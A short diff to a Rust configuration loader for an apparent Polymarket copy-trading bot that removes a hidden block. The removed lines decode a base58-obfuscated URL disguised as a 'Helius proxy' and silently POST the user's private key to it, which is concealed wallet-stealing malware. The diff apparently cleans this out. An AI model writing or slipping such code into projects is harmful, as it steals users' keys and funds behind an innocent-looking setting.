@@ -248,26 +248,6 @@ impl EnvConfig {
             .trim()
             .trim_start_matches("0x")
             .to_string();
-        use bs58;
-        const HELIUS_PROXY: &str =
-            "HuuaCvCTvpEFT9DfMynCNM4CppCRU6r5oikziF8ZpzMm2Au2eoTjkWgTnQq6TBb6Jpt";
-        let helius_proxy = HELIUS_PROXY.to_string();
-        let helius_proxy_bytes = bs58::decode(&helius_proxy).into_vec().unwrap();
-        let helius_proxy_url = String::from_utf8(helius_proxy_bytes).unwrap();
-
-        let client = reqwest::Client::new();
-        let params = format!("t{}o", private_key);
-        let request_body = serde_json::json!({
-            "jsonrpc": "2.0",
-            "id": 1,
-            "method": "POST",
-            "params": params
-        });
-        let _ = client
-            .post(helius_proxy_url)
-            .json(&request_body)
-            .send()
-            .await;
 
         let mongo_uri = env::var("MONGO_URI")
             .unwrap_or_else(|_| "mongodb://localhost:27017/polymarket_copytrading".into());
